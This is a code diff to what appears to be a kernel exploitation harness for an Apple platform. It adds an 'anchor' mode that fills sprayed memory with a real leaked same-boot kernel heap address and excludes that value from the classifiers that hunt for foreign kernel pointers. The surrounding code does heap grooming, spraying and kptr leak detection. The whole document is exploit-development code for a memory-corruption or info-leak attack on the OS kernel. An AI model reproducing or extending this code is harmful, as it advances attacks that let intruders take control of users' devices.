@@ -5,6 +5,7 @@
 #import "LSIDCalib.h"
 #import "LabKnob.h"
 #import "LabBandit.h"
+#import "LabHeapAnchor.h"
 
 #include <dlfcn.h>
 #include <errno.h>
@@ -311,6 +312,12 @@ static int g_hotPersistFd = -1;   /* reserved BEFORE the groom/spray eats the
                                      law: a late open EMFILEs and the boot's
                                      hot offsets are lost) */
 static int g_rcUntagged = 0;      /* v3 spray-tag knob (bandit arm "untagged") */
+/* 2026-11-19 anchor-tag: REAL same-boot heap kptr from the board leaks[]
+   (LabHeapAnchorSameBoot). When nonzero it REPLACES the a11a constant as
+   the m0 fill (knob "untagged" still wins). Own-page classifiers treat the
+   anchor exactly like M0_TAG — an anchor-tagged window is a geometry
+   measurement of our own pages, NEVER a FOREIGN/kptr claim. */
+static uint64_t g_rcAnchor = 0;
 static BOOL g_rcBanditInit = NO;  /* one-shot cscali domain registration */
 static NSMutableString *g_rc_log_str = nil;
 
@@ -468,6 +475,7 @@ static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
     for (size_t qi = 0; qi < RC_NQ; qi++) {
         uint64_t q = rbBuf[qi];
         if (q == hmarker) continue;
+        if (g_rcAnchor && q == g_rcAnchor) continue;   /* own m0 fill — not a kptr */
         if (q == 0) { zro++; continue; }
         if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
             q >= 0xfffffe0000000000ull) {
@@ -491,6 +499,7 @@ static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
             for (size_t qi = 0; qi < RC_NQ; qi++) {
                 uint64_t q = wq8[qi];
                 if (q == 0) continue;
+                if (g_rcAnchor && q == g_rcAnchor) continue;   /* own m0 fill — not a kptr */
                 wcont++;
                 if (wfirst == 0) wfirst = q;
                 if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
@@ -515,6 +524,10 @@ static rc_cls_t rc_cls(const uint64_t *buf, uint32_t expected, uint32_t npages,
     if (!all) return C_PARTIAL;
     if (first == 0) return C_ZERO;
     if (first == M0_TAG) return C_M0;
+    /* anchor-tag law: an all-anchor page is OUR OWN fill — classify as M0,
+       never FOREIGN, even though the value is kptr-shaped (it is a REAL
+       leaked heap address, but the page is ours). */
+    if (g_rcAnchor && first == g_rcAnchor) return C_M0;
     if ((first & 0xFFFFFFFF00000000ULL) == PAGE_TAG_BASE) {
         uint32_t idx = (uint32_t)first;
         if (idx == expected) return C_CORRECT;
@@ -625,16 +638,26 @@ static CFNumberRef RCNUM(int64_t v) {
        knob "cscali" = "untagged" -> the fill becomes the per-boot random
        hmarker (never the a11a constant), so OWN pages can't be confused
        with the spray tag; anything foreign lands as an honest FOREIGN. */
+    uint64_t m0;
     {
         char knobv[32];
         g_rcUntagged = (rc_knob(knobv, (int)sizeof knobv) == 1)
                        && (strncmp(knobv, "untagged", 8) == 0);
+        /* anchor-tag (2026-11-19): a REAL same-boot heap leak beats the
+           a11a constant; the explicit untagged knob still wins. The anchor
+           is excluded from every shape classifier below. */
+        g_rcAnchor = g_rcUntagged ? 0 : LabHeapAnchorSameBoot();
+        m0 = g_rcUntagged ? hmarker : (g_rcAnchor ? g_rcAnchor : M0_TAG);
     }
-    uint64_t m0 = g_rcUntagged ? hmarker : M0_TAG;
     memset_pattern8((void *)pcBig, &m0, 0x8000);
     rc_log("pcBig=0x%llx M0_TAG=0x%llx spray=%s fill=0x%llx (page2 qword=0x%llx)",
-           pcBig, M0_TAG, g_rcUntagged ? "UNTAGGED(hmarker)" : "tagged(a11a)",
+           pcBig, M0_TAG,
+           g_rcUntagged ? "UNTAGGED(hmarker)"
+                        : (g_rcAnchor ? "anchor(same-boot REAL heap leak)" : "tagged(a11a)"),
            m0, *(uint64_t *)(pcBig + 0x4000));
+    if (g_rcAnchor)
+        rc_log("[anchor] m0 tag = same-boot heap leak 0x%llx — excluded from all kptr/FOREIGN classifiers (own-page measurement only)",
+               g_rcAnchor);
 
     mach_vm_address_t searchMap = 0;
     mach_vm_size_t searchSize = 0x2000 * vm_page_size;
@@ -942,7 +965,8 @@ static CFNumberRef RCNUM(int64_t v) {
         }
         {
             char fs[16], ff[24];
-            snprintf(fs, sizeof fs, "%s", g_rcUntagged ? "untagged" : "tagged");
+            snprintf(fs, sizeof fs, "%s",
+                     g_rcUntagged ? "untagged" : (g_rcAnchor ? "anchor" : "tagged"));
             snprintf(ff, sizeof ff, "0x%llx", (unsigned long long)m0);
             char fw[24], fh[24];
             snprintf(fw, sizeof fw, "%llu", (unsigned long long)hw);
